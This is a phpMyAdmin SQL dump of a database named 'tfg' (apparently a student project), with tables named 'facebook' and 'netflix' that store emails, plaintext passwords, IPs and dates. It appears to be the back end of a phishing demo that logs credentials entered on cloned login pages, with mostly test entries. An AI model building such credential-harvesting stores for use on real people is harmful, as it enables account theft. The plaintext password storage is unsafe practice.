-- phpMyAdmin SQL Dump
-- version 5.1.3
-- https://www.phpmyadmin.net/
--
-- Servidor: 127.0.0.1
-- Tiempo de generación: 30-03-2022 a las 12:45:25
-- Versión del servidor: 10.4.22-MariaDB
-- Versión de PHP: 7.4.28

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `tfg`
create database tfg;
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `facebook`
--

CREATE TABLE `facebook` (
  `correo` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `date` varchar(30) NOT NULL,
  `ip` varchar(30) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `facebook`
--

INSERT INTO `facebook` (`correo`, `password`, `date`, `ip`) VALUES
('admin@admin.com', 'admin', '0000-00-00', '::1'),
('masonrapa@gmail.com', 'mason', '0000-00-00', '::1'),
('sandra@sandra.com', 'sandra', '0000-00-00', '::1'),
('sandra@sandra.com2', 'sandra2', '11:35 30-03-22', '::1');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `netflix`
--

CREATE TABLE `netflix` (
  `correo` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `ip` varchar(30) NOT NULL,
  `date` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `netflix`
--

INSERT INTO `netflix` (`correo`, `password`, `ip`, `date`) VALUES
('admin@net.com', 'net', '::1', '0000-00-00'),
('admin@net.com', 'net', '::1', '0000-00-00'),
('admin@net.com', 'a', '::1', '0000-00-00'),
('aaa@aa.com', 'aaaa', '::1', '0000-00-00'),
('mason@gmail.com', 'putos', '192.168.43.244', '0000-00-00'),
('sandra@sandra.com', 'sandra', '::1', '11:28 30-03-22');
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
